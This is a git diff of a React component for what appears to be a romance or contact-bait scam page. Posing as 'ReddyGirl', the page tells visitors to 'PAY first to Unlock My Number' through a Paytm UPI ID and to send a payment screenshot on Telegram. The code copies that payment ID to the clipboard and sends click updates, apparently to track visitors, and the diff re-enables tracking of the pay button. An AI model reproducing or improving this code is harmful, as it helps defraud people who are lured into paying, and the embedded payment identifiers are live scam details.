@@ -2,10 +2,9 @@
 /* eslint-disable no-unused-vars */
 import './App.css';
 import React, { useEffect, useState } from 'react';
-import { Modal, ModalHeader } from 'reactstrap';
-import PaymentModal from './modal';
-import ConfirmModal from './confirm';
-import PaymentOptions from './PaymentOptions';
+import WhatsappModal from './WhatsappModal';
+import PaymentModal from './PaymentModal';
+import CopyModal from './CopyModal';
 
 let ip = 'Not Found'
 
@@ -37,24 +36,23 @@ async function sendUpdate(msg) {
 }
 
 function App() {
-  const [isOpen, setisOpen] = useState(false);
-  const [isConfirmOpen, setisConfirmOpen] = useState(false);
+  const [isPaymentOpen, setIsPaymentOpen] = useState(false);
+  const [isWhatsappOpen, setIsWhatsappOpen] = useState(false);
 
   const handlepayButton = async () => {
     console.log('pay button clicked')
-    setisConfirmOpen(!isOpen)
-    // await sendUpdate("PayButton")
+    setIsPaymentOpen(!isPaymentOpen);
+    await sendUpdate("PayButton")
   }
 
   const togglePay = () => {
-    setisConfirmOpen(!isConfirmOpen);
+    setIsPaymentOpen(!isPaymentOpen);
   }
 
   const handleWspButton = async () => {
-    setisOpen(!isOpen)
+    setIsWhatsappOpen(!isWhatsappOpen)
     await sendUpdate("WhatsppBtn")
     //window.open("upi://pay?pa=paytmqr28100505010111o4jao8e1ay@paytm&pn=ReddyGirl&tn=ReddyGirl&am=1000", "_self");
-    //return (<PaymentModal isOpen={true}></PaymentModal>)
   }
 
   const MsgBtnCombo = ({ msg, btnName, handler, err }) => {
@@ -81,8 +79,8 @@ function App() {
         <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
         <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
         <h6 style={{ color: "bisque", fontSize: "1rem" }}>PAY NOW and Send me SCREENSHOT on Telegram!!🥰</h6>
-        {isOpen && <PaymentModal isOpen={isOpen} setisOpen={setisOpen} togglePay={togglePay} className="special_modal"></PaymentModal>}
-        {isConfirmOpen && <ConfirmModal isOpen={isConfirmOpen} setisOpen={setisConfirmOpen} fn={handlepayButton} className="special_modal"></ConfirmModal>}
+        <WhatsappModal isOpen={isWhatsappOpen} setisOpen={setIsWhatsappOpen} togglePay={togglePay} className="special_modal"></WhatsappModal>
+        <PaymentModal isOpen={isPaymentOpen} setisOpen={setIsPaymentOpen} className="special_modal"></PaymentModal>
       </header>
     </div >
   );
@@ -93,24 +91,6 @@ function CopyExample() {
 
   const toggle = () => {
     setIsCopyOpen(!isCopyOpen)
-  }
-
-  const Copymodal = () => {
-
-    return (
-      <div>
-        <Modal style={{ padding: "10vh 15px" }} isOpen={isCopyOpen} toggle={toggle} fade={true} className="special_modal">
-          <ModalHeader toggle={toggle} style={{ borderBottom: '0px', display: 'block', textAlign: 'center' }}>
-            <h6 style={{ color: 'yellow' }}>UPI ID <span style={{ color: "#fff" }}>Copied</span> to Clipboard!!<img style={{ width: '30px', marginLeft: '3px' }} src='./tick.png'></img></h6>
-            <div className='insideCard'>
-              <p style={{ margin: "0px" }}>Select <span style={{ color: "#fff" }}>Application</span> and Paste the UPI ID</p>
-            </div>
-            <PaymentOptions shouldPopulateVpa={false} isPay={false}></PaymentOptions>
-          </ModalHeader>
-        </Modal>
-      </div>
-    );
-
   }
 
   return (
@@ -132,15 +112,11 @@ function CopyExample() {
           <input title='paytmqr281005050101jnirp1ueoe1y@paytm' readOnly value={"PaytmQR281......@paytm"} style={{ fontSize: '17px', textOverflow: 'ellipsis', fontWeight: 'normal', cursor: 'copy' }}></input >
           <button title='paytmqr281005050101jnirp1ueoe1y@paytm' className='cpybutton' onClick={async () => {
             navigator.clipboard.writeText("paytmqr281005050101jnirp1ueoe1y@paytm");
-            setTimeout(() => {
-              // window.location.href = 'upi://pay?pa=paytmqr281005050101jnirp1ueoe1y@paytm&cu=INR&pn=Reddy%20Girl'
-            }, 2500);
             setIsCopyOpen(true);
-            // await sendUpdate('Copied');
           }}>Copy</button>
         </div>
       }
-      <Copymodal></Copymodal>
+      {isCopyOpen && <CopyModal isOpen={isCopyOpen} setIsOpen={setIsCopyOpen}></CopyModal>}
     </div >
   );
 }
